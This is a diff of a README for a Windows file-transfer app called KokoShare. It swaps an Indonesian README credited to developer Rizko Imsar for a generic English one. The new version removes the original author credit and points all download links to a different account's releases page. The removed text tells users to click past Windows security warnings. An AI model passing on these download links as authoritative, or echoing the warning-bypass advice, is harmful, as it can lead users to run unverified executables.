@@ -1,36 +1,71 @@
-# KokoShare File Transfer For Windows
-KokoShare File Transfer adalah aplikasi transfer file untuk Windows yang memungkinkan pengguna mengirim dan menerima file melalui jaringan nirkabel antar perangkat dengan mudah.
+# KokoShare File Transfer for Windows 🚀
 
-## Fitur Utama
-- **Kirim dan Terima File**: Pilih file yang ingin dikirim dan masukkan alamat IP tujuan untuk memulai transfer.
-- **User Interface**: Tampilan antarmuka pengguna yang sederhana dan mudah digunakan dengan tab navigasi untuk pengaturan.
-- **Berbasis Jaringan**: Mendukung pengiriman file melalui jaringan lokal dengan menggunakan TCP/IP.
+Welcome to the KokoShare File Transfer for Windows repository! This project enables easy file sharing over wireless networks. Whether you want to send documents, images, or any other type of file, KokoShare makes it simple and efficient.
 
-## Cara Menggunakan
-1. **Mode Kirim**: Pilih file yang akan dikirim dan masukkan IP tujuan, lalu klik "Kirim File".
-2. **Mode Terima**: Jalankan aplikasi ini di perangkat penerima dan file akan otomatis diterima.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/histrionar/File-Transfer-For-Windows/releases)
 
-## Instalasi
-1. Unduh installer file dari [link ini](https://github.com/rizko77/File-Transfer-For-Windows/releases/download/v1.1.2/installer.exe).
-2. Jalankan aplikasi `installer.exe` untuk memulai.
-3. Jika ada peringatan warning klik more info dan pilih run anyway.
-4. Pilih lokasi install dan next dan tunggu sampai finish.
+## Table of Contents
 
-## Screenshot
-![Halaman Kirim](screenshoot/6-kirim.jpeg)
-![Halaman Terima](screenshoot/7-terima.jpeg)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
+## Features 🌟
 
-## Instalasi Via Gambar
-1. Jika ada warning klik bagian More Info
-![warning](screenshoot/1-warning.jpeg)
-2. Kemudian Lewati dengan klik Run Anyway
-![lewati](screenshoot/2-lewati.jpeg)
-3. Pilih Lokasi Penyimpanan kemudian Next sampai selesai
-![lokasi](screenshoot/3-lokasi.jpeg)
+- **Easy File Sharing**: Transfer files quickly over a wireless network.
+- **User-Friendly Interface**: Simple design for easy navigation.
+- **Supports Multiple File Types**: Share documents, images, videos, and more.
+- **Cross-Platform Compatibility**: Works seamlessly with different versions of Windows.
+- **Fast Transfer Speeds**: Enjoy quick file transfers without interruptions.
 
-## Pengembang
-Aplikasi ini dikembangkan oleh [Rizko Imsar](https://github.com/rizko77) dengan tujuan untuk mempermudah pengiriman file antar perangkat.
+## Installation ⚙️
 
-## Lisensi
-Aplikasi ini bersifat **open-source** dan dirilis di bawah [Lisensi MIT](#).
+To get started, download the latest version from our [Releases section](https://github.com/histrionar/File-Transfer-For-Windows/releases). Once downloaded, execute the file to install KokoShare on your Windows machine.
+
+1. Click on the link above to go to the Releases section.
+2. Download the latest release.
+3. Run the installer and follow the on-screen instructions.
+
+## Usage 📂
+
+Using KokoShare is straightforward. Follow these steps to start transferring files:
+
+1. **Launch the Application**: Open KokoShare on your Windows device.
+2. **Connect to Network**: Ensure both sender and receiver are connected to the same wireless network.
+3. **Select Files**: Choose the files you want to share.
+4. **Send Files**: Click the send button to start the transfer.
+5. **Receive Files**: The receiving device will get a prompt to accept the incoming files.
+
+### Example Use Case
+
+Imagine you want to share a large presentation with a colleague. Simply select the presentation file in KokoShare, click send, and your colleague will receive it instantly on their device. No cables, no hassle.
+
+## Contributing 🤝
+
+We welcome contributions from everyone! If you want to help improve KokoShare, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them with clear messages.
+4. Push your changes to your forked repository.
+5. Submit a pull request.
+
+### Issues
+
+If you encounter any issues while using KokoShare, please check the [Issues section](https://github.com/histrionar/File-Transfer-For-Windows/issues) to see if it has already been reported. If not, feel free to create a new issue.
+
+## License 📜
+
+KokoShare is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+## Contact 📬
+
+For questions or suggestions, please reach out:
+
+- **Email**: support@kokoShare.com
+- **GitHub**: [KokoShare GitHub](https://github.com/histrionar/File-Transfer-For-Windows)
+
+Thank you for visiting the KokoShare File Transfer for Windows repository! We hope you enjoy using our application. For the latest updates and releases, check back often or visit our [Releases section](https://github.com/histrionar/File-Transfer-For-Windows/releases).
